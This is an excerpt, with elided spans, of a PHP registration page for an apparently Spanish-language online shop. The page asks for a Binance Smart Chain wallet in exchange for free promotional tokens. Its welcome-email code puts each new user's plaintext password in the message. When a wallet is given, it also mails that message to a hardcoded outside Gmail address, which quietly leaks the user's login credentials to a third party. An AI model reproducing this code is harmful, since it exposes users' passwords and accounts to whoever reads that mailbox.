...
// build the message content
      ...
      if (ACCOUNT_GENDER == 'true') {
        ...
        $email_text = sprintf(EMAIL_GREET_NONE, $firstname);
         ...
         $passtext .= '<p>USUARIO Y CONTRASEÑA</p>';
         $passtext .= '<p>Usuario: <b><font size="5"></font><font size="5">'.$email_address.'</font></b></p>';
         $passtext .= '<p>Contraseña: <b><font size="5">'.$password.'</font></b></p>';
         $passtext .= HTTPS_SERVER . '/login.php';
         $passtext .= '<p></p>';

          $billeteraT .= '<p style="margin-top: 0; margin-bottom: 0">Billetera de CLiente ' . $billetera.'</p>';
          $billeteraT .= '<p style="margin-top: 0; margin-bottom: 0">Nombre de Token: BitShop'.'</p>';
          $billeteraT .= '<p style="margin-top: 0; margin-bottom: 0">Dirección del Token ' . '0x4f9c69652ecafbd1c7b3f14429e7411e1a197713'.'</p>';
          $billeteraT .= '<p style="margin-top: 0; margin-bottom: 0">Red Binance SmartChain BCS '.'</p></p>';
          
          $billeteraT .= '<p>Solamente por registrarse y facilitar su billetera BSC recibirá de regalo una muestra de nuestra criptomoneda, en nuestras tiendas puedes pagar también con BUSD la moneda estable de https://Binance.com, Mas información '.'</p><p style="margin-top: 0; margin-bottom: 0">';

          $billeteraR .= '<p style="margin-top: 0; margin-bottom: 0">Solamente por registrarse y facilitar su billetera BSC recibirá de regalo una muestra de nuestra criptomoneda, en nuestras tiendas puedes pagar también con BUSD la moneda estable de https://Binance.com, Mas información '.'</p>';
          $billeteraR .= '<p style="margin-top: 0; margin-bottom: 0">Instalese una billetera y configure en su cuenta, "Editar Cuenta" '.'</p>';
          $billeteraR .= '<p style="margin-top: 0; margin-bottom: 0">' . HTTPS_SERVER . '/account_edit.php'.'</p><p style="margin-top: 0; margin-bottom: 0">';

      $email_textT .= EMAIL_WELCOME . $billeteraT . $passtext . EMAIL_TEXT . EMAIL_CONTACT . EMAIL_WARNING;
      $email_text .= EMAIL_WELCOME . $passtext . EMAIL_TEXT . EMAIL_CONTACT . EMAIL_WARNING;



  if ($billetera){
      tep_mail($name, 'patrocinees@gmail.com', EMAIL_SUBJECT, $email_textT, STORE_OWNER, STORE_OWNER_EMAIL_ADDRESS);
      
      tep_mail($name, $email_address, EMAIL_SUBJECT, $email_textT, STORE_OWNER, STORE_OWNER_EMAIL_ADDRESS);
...
?>
      ...
      <tr>
        ...
        <td class="fieldValue"><?php echo tep_draw_input_field('firstname') . '&nbsp;' . (tep_not_null(ENTRY_FIRST_NAME_TEXT) ? '<span class="inputRequirement">' . ENTRY_FIRST_NAME_TEXT . ' Requerido</span> ': ''); ?></td>
      </tr>
      <tr> 
      ...
      <tr>
        ...
        <td class="fieldValue"><?php echo tep_draw_input_field('telephone') . '&nbsp;' . (tep_not_null(ENTRY_TELEPHONE_NUMBER_TEXT) ? '<span ">' . ENTRY_TELEPHONE_NUMBER_TEXT . ' Opcional': ''); ?></td>
      </tr>
      <tr>
      <tr>
        <td class="fieldKey"><?php echo ENTRY_EMAIL_ADDRESS; ?></td>
        <td class="fieldValue"><?php echo tep_draw_input_field('email_address') . '&nbsp;' . (tep_not_null(ENTRY_EMAIL_ADDRESS_TEXT) ? '<span class="inputRequirement">' . ENTRY_EMAIL_ADDRESS_TEXT . ' Requerido</span>': ''); ?></td>
      </tr>
...
?>
 ...
 <h2><p><b><font size="4"><?php echo 'Provincia y País' ;; ?></font></b></p>   </h2>
...
<?php
    ...
    if (tep_not_null(ENTRY_STATE_TEXT)) echo '&nbsp;<span class="inputRequirement">' . ENTRY_STATE_TEXT . ' Requerido</span>';
?>
        </td>
      </tr>
...
?>
      ...
      <tr>
        ...
        <td class="fieldValue"><?php echo tep_get_country_list('country') . '&nbsp;' . (tep_not_null(ENTRY_COUNTRY_TEXT) ? '<span class="inputRequirement">' . ENTRY_COUNTRY_TEXT . ' Requerido</span>': ''); ?></td>
      </tr>
 ...
 <h2><p><b><font size="4"><?php echo CATEGORY_PASSWORD;; ?></font></b></p>   </h2>
  ...
  <div class="contentText">
    <table border="0" cellspacing="2" cellpadding="2" width="100%">
      <tr>
        <td class="fieldKey"><?php echo ENTRY_PASSWORD; ?></td>
        <td class="fieldValue"><?php echo tep_draw_password_field('password') . '&nbsp;' . (tep_not_null(ENTRY_PASSWORD_TEXT) ? '<span class="inputRequirement">' . ENTRY_PASSWORD_TEXT . ' Requerido</span>': ''); ?></td>
      </tr>
      <tr>
        <td class="fieldKey"><?php echo ENTRY_PASSWORD_CONFIRMATION; ?></td>
        <td class="fieldValue"><?php echo tep_draw_password_field('confirmation') . '&nbsp;' . (tep_not_null(ENTRY_PASSWORD_CONFIRMATION_TEXT) ? '<span class="inputRequirement">' . ENTRY_PASSWORD_CONFIRMATION_TEXT . ' Requerido</span>': ''); ?></td>
      </tr>
    </table>
  </div>
 ...
 <h2><p><b><font size="4"><?php echo 'DATOS PARA ENVIO POR MENSAJERÍA' ;; ?></font></b></p>   </h2>
  ...
  <div class="contentText">
    <table border="0" cellspacing="2" cellpadding="2" width="100%">
      <tr>
        ...
        <td class="fieldKey"><?php echo 'Número de Documento DNI/NIE/CIF'; ?></td>
      ...
      <tr>
        ...
        <td class="fieldValue"><?php echo tep_draw_input_field('billetera') . '&nbsp;' . (tep_not_null('billetera') ? '' . '' . ' Opcional Billetera Red Binance BSC': ''); ?></td>
      </tr>
 ...
 <h2><p><b><font size="4"><?php echo 'Dirección de Envío'; ?></font></b></p>   </h2>
